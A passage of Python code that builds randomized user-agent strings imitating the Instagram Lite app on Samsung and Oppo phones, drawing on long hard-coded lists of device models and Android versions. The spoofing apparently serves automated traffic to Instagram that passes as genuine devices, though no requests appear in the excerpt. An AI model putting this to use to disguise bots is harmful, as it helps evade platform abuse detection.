'GT-S7582', 'GT-S7582', 'GT-S7582', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'SPH-D710', 'SHV-E120S', 'SHV-E120L', 'SHV-E120K/KKJMD2', 'SHV-E120L', 'SHV-E120LSK', 'SHV-E120LSK', 'SHV-E120LKS', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S/KKJMD2', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'ISW11SC', 'SCH-I535', 'GT-I9300', 'GT-I9300', 'GT-I9305', 'SCH-R530X', 'SCH-R530X', 'SCH-R530U', 'GT-I9305T', 'SCH-R530C', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190N', 'GT-I8190', 'GT-I8190T', 'GT-I8190N', 'GT-I8200N', 'GT-I8200', 'GT-I8200', 'GT-I8200N', 'GT-I8200', 'GT-I8200L', 'GT-I8200', 'GT-I8200Q', 'GT-I8200Q', 'GT-I9301I', '720x1280', 'Samsung Galaxy S IV(I950X)', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SAMSUNG GT-I9001/I9001BOKQ4', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SM-G973F', 'SAMSUNG SM-G973F', 'SAMSUNG SM-G973U', 'SM-G977N', 'SM-G973U1', 'SAMSUNG SM-G973F/G973FXXSGHWC2', 'SAMSUNG SM-G977N', 'SAMSUNG SM-G770F', 'SM-G770F/DS', 'SM-G975F', 'SAMSUNG SM-G975F', 'SM-G975U', 'SM-G975U1', 'SAMSUNG SM-G975U', 'SAMSUNG SM-G975F/G975FXXSGHWC2', 'SC-05L', 'SM-G970F', 'SAMSUNG SM-G970F/G970FXXSGHWA3', 'SM-G970U', 'SM-G970U1', 'SAMSUNG SM-G980F', 'SM-G980F/DS', 'SM-G981U', 'SM-G981U', 'SM-G981B', 'SCG01', 'SM-G981U1', 'SM-G981W', 'SM-G981V', 'SM-G981N', 'SC-51A', 'SM-G9810', 'SC51Aa', 'SM-G780G', 'SAMSUNG SM-G780F', 'SAMSUNG SM-G780G', 'SM-G781B', 'SM-G781V', 'SM-G781U', 'SM-G781U1', 'Galaxy S20 Ultra', 'SM-G988B', 'SM-G988W', 'SM-G988U', 'SAMSUNG SM-G988B', 'SM-G988U1', 'SM-G988N', 'SAMSUNG SM-G985F/G985FXXSFFVIB', 'SM-G985F/DS', 'SM-G986B', 'SM-G986U', 'SAMSUNG SM-G986B', 'SM-G986N', 'SM-G986W', 'SM-G986U1', 'Galaxy S21', 'SM-G991W', 'SM-G991U1', 'SM-G991B', 'SM-G991B', 'SM-G991B', 'SC-51B', 'SM-G991V', 'SM-G990U2', 'SM-G990B2', 'SAMSUNG SM-G990B', 'SM-G990E', 'SAMSUNG SM-G990B/G990BXXU4EWC7', 'SM-G998U', 'SAMSUNG SM-G998B', 'SM-G998N', 'SM-G998U1', 'SAMSUNG SM-G998U', 'SM-G998W', 'Galaxy S21+', 'SM-G996U', 'SM-G996B', 'SM-G996N', 'SM-G996B', 'SM-G9960', 'SM-S901U', 'SAMSUNG SM-S901U', 'SM-S901U1', 'SM-S901B', 'SAMSUNG SM-S901B', 'SM-S901W', 'SAMSUNG SM-S908E', 'SM-S908B', 'SAMSUNG SM-S908U', 'SM-S908U1', 'SM-S9080', 'SM-S908U1', 'SAMSUNG SM-S908B', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906N', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906B', 'SM-S906U1', 'SM-S906W', 'SM-S911W', 'SM-S911B', 'SM-S911U', 'SM-S911U1', 'SM-S918W', 'SAMSUNG SM-S918B/S918BXXS1AWD1', 'SM-S918U', 'SM-S918U1', 'SM-S916U', 'SM-S916B', 'SM-S916U1', 'SM-S916W', 'Galaxy S3', 'Samsung Galaxy S3', 'Galaxy S3', 'SM-G730V', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SM-G730W8', 'GT-I9505', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SCH-I959', 'SAMSUNG GT-I9505-ORANGE', 'SCH-I545', 'GT-I9500', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SAMSUNG GT-I9505', 'SAMSUNG GT-I9505/I9505XXUAMDC', 'SAMSUNG GT-I9505/I9505XXUDMGG', 'GT-I9295', 'SHV-E330S', 'SHV-E330L', 'SAMSUNG SHV-E330L', 'SHV-E330S', 'SHV-E330K', 'SAMSUNG SHV-E330S', 'SHV-E330K', 'GT-I9195', 'lineage_serranoltexx', 'GT-I9195I', 'GT-I9192I', 'GT-I9190', 'GT-I9192', 'SCH-I435', 'GT-I9515', 'GT-I9506', 'SAMSUNG GT-I9506', 'SAMSUNG SM-C105L', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C105', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105S', 'SM-C105L', 'SM-G900T', 'SM-G900F', 'SM-G900V', 'SM-G900M', 'SM-G900F', 'SM-G900P', 'SM-G900H', 'SM-G9006V', 'SM-G900F', 'SM-G870W', 'SAMSUNG-SM-G890A', 'SAMSUNG-SM-G870A', '1080x1920', 'SAMSUNG SM-G890A', 'SM-G900FD', 'SM-G860P', 'SM-G901F', 'SAMSUNG SM-G901F/G901FXXU1CPHA', 'SM-G800F', 'SM-G800H', 'SM-G903F', 'SM-G903W', 'SM-G920I', 'SM-G920P', 'SM-G920F', 'SM-G920W8', 'SAMSUNG SM-G920F', 'SM-G920K', 'SAMSUNG-SM-G920A', 'SM-G925F', 'SM-G925K', 'SAMSUNG-SM-G925A', 'SM-G9250', 'SAMSUNG SM-G925F', 'SAMSUNG SM-G928F', 'SAMSUNG-SM-G928A', 'SM-G928C', 'SM-G9280', 'SM-G9287', 'SAMSUNG SM-G928T', 'SM-G928I', 'SM-G930F', 'SM-G930W8', 'SAMSUNG SM-G930F', 'SM-G930V', 'SM-G930U', 'SM-G930S', 'SM-G930L', 'SM-G9300', 'SAMSUNG-SM-G891A', 'SAMSUNG SM-G891A', 'SM-G935F', 'SM-G935U', 'SAMSUNG SM-G935A', 'SM-G935T', 'SM-G935VC', 'SM-G935S', 'SM-G935L', 'SAMSUNG SM-G935W8', 'SM-G9350', 'SAMSUNG SM-G950U', 'SAMSUNG SM-G950F', 'SM-G950U1', 'SM-G950N', 'SC-02J', 'SAMSUNG SM-G950W', 'SM-G892A', 'SAMSUNG SM-G892A', 'SAMSUNG SM-G892U', 'SM-G8750', 'SM-G8750', 'SM-G8750', 'SAMSUNG SM-G8750', 'SM-G955U', 'SM-G955F', 'SAMSUNG SM-G955F/G955FXXUCDVG4', 'SM-G955W', 'SM-G9550', 'SM-G960F', 'SM-G960U', 'SAMSUNG SM-G960U1', 'SAMSUNG SM-G960F', 'SM-G965U', 'SM-G965F', 'SM-G965F', 'SM-G965U1', 'SM-G9650', 'SAMSUNG-SM-J321AZ', 'SAMSUNG-SM-J321AZ', 'SAMSUNG SM-J321AZ', 'SAMSUNG-SM-J326AZ', 'SM-J336AZ', 'SAMSUNG SM-J336AZ', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700R', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'GT-P1000', 'GALAXY TAB', 'Galaxy Tab', 'GT-P1000', 'Galaxy Tab 2', 'Galaxy Tab 2 3G', 'GT-P3100', 'Flow', 'GT-P3113', 'GT-P3113', 'GT-P3110', 'GT-P3110', 'SM-T116', 'SM-T116NU', 'SM-T116NY', 'SM-T116NQ', 'Galaxy Tab 4', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'Galaxy Tab KT107', 'Galaxy Tab Pro', 'Galaxy Tab PRO 10', 'SAMSUNG-SM-T2519', 'Samsung galaxy tab s3', 'Galaxy Tab2 3G', 'Galaxy Tab3 P5200', 'Galaxy Tab3 T311', 'Galaxy Tab4', 'GT-S7560', 'SAMSUNG GT-S7560/S7560XXBNC2', 'GT-S7560M', 'SAMSUNG GT-S7560/S7560XXBNJ1', 'SAMSUNG GT-S7560/S7560XXAME9', 'SAMSUNG GT-S7560/S7560XXAMH3', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'SCH-I699I', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560', 'GT-S7560', 'GT-S7560', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', '800x1212', 'GT-S7390', 'GT-S7390', 'GT-S7390G', 'GT-S7390', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SAMSUNG GT-S7580/S7580XXUBOA1', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SM-G318MZ', 'SM-G318HZ', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'GT-I8150', 'SAMSUNG-SM-W2016', 'SM-W2016', 'SM-W2018', 'SM-W2018', 'SAMSUNG SM-W2019', 'SM-W2019', 'SAMSUNG SM-W2021', 'SM-W2021', 'SM-W2021', 'SAMSUNG SM-W2022', 'SAMSUNG SM-W9023', 'SM-G600S', 'SAMSUNG SM-G600S', 'SAMSUNG SM-E426S', 'GT-I8552', 'GT-I8552', 'GT-I8552B', 'GT-I8552', 'GT-I8552', 'SM-G3812', 'SM-G3812', 'SM-G3812B', 'SM-G3812B', 'SM-G3812', 'SM-G3812', 'Samsung SM-G3818', 'SM-G3818', 'SM-G3812', 'Galaxy Wonder', 'SX Galaxy Xcove 4S', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710-ORANGE/S7710XXANE3', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 'GT-S7710', 'GT-S7710L', 'SM-G388F', 'SAMSUNG SM-G388F', 'SM-G389F', 'SM-G390F', 'SM-G390W', 'SM-G398FN', 'SAMSUNG SM-G398FN', 'SM-G525F', 'SM-G525N', 'SAMSUNG SM-G525F', 'SM-G736U1', 'SM-G736B', 'SM-G736W', 'SAMSUNG SM-G736B', 'SM-G889A', 'SM-G715FN', 'SAMSUNG SM-G715FN', 'SM-G715U1', 'SM-G715W', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'gt-s5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360', 'GT-S5360L', 'GT-S5360L', 'GT-S5360L', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'GT-B5510', 'SAMSUNG GT-B5510/B5510XXLE1', 'SAMSUNG GT-B5510/B5510XXLL1', 'GT-B5510', 'GT-B5510L', 'GT-B5510B', 'GT-B5510L', 'GT-B5510', 'GT-B5510', 'GT-B5510-ORANGE/B5510BVLH1', 'GT-B5510-ORANGE/B5510BVLF1', 'GT-B5510-ORANGE/B5510BVLD1', 'GT-B5510-ORANGE/B5510BVLB1', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-B5512B', 'GT-B5512', 'GT-B5512', 'GT-B5512', 'GT-B5512B', 'GT-S6310N', 'GT-S6310B', 'GT-S6310N', 'GT-S6310N', 'GT-S6310N-ORANGE/S6310NXXAMK1', 'GT-S6310T', 'GT-S6310T', 'GT-S6310L', 'GT-S6310L', 'GT-S6310L', 'GT-S6310T', 'GT-S6310N', 'GT-S6310L', 'SM-G130H', 'SM-G130HN', 'SM-G130E', 'SM-G130BT', 'SM-G130BU', 'SM-G130BU', 'SM-G130BU', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'GT-S6312', 'SM-F700N', 'U', 'SM-F700U1', 'SM-F7000', 'SM-F700W', 'SM-F711U1', 'SAMSUNG SM-F711B/F711BXXU2CVC7', 'SM-F711N', 'SAMSUNG SM-F711U', 'SM-F721B', 'SM-F721U', 'SAMSUNG SM-F721B', 'SM-F721U1', 'SM-F707B', 'SAMSUNG SM-F707B', 'SM-F707U', 'SM-F7070', 'SM-F707U1', 'SM-F707UZAAXAA', 'SM-F707W', 'SM-F916B', 'SM-F916U', 'SAMSUNG SM-F916B', 'SAMSUNG SM-F916U1', 'SM-F926U', 'SM-F926B', 'SM-F9260', 'SM-F926N', 'SM-F926W', 'SAMSUNG SM-F926B', 'SM-F936U', 'SAMSUNG SM-F936B', 'SM-F936U', 'SM-F936U1', 'SAMSUNG SM-F936W', 'galaxy Z Fold2', 'SAMSUNG SM-Z130H', 'SM-Z200F', 'SM-Z300H', 'SM-Z300H', 'SAMSUNG SM-Z300H', 'Gear Live', 'SM-R750', 'GT-I9060I', 'GT-I9060I', 'Samsung J600GN,telcel,mx', 'SAMSUNG M2004J19C', 'SAMSUNG M2006C3LG', 'SAMSUNG M2102J20SG', 'Samsung M6', 'Samsung N70', 'SAMSUNG N9106', 'SAMSUNG-N9106', 'SAMSUNG-N9106HD', 'GT-I8000', 'SAMSUNG-P9700', 'SAMSUNG S2_PRO', 'SM-G530T1', 'SAMSUNG-T805C', 'SAMSUNG-T805S', 'SAMSUNG-T950S', 'GT-S8500'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; samsung; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Oppo':
                    self.android_version = random.choice(['13', '11', '12'])
                    self.device_model = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; OPPO; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Vivo':
                    self.android_version = random.choice(['12', '11', '13', '9', '10'])
